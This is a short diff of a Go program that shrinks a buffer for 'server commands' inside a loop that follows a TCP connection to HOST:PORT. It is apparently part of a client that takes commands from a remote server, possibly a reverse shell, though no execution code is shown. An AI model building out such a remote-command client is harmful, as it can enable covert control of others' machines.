@@ -17,7 +17,7 @@ func main() {
 		conn, err = net.Dial("tcp", HOST+":"+PORT)
 	}
 
-	buff := make([]byte, 2048) // buffer for the server commands
+	buff := make([]byte, 1024) // buffer for the server commands
 
 	// start infinite loop
 	for {
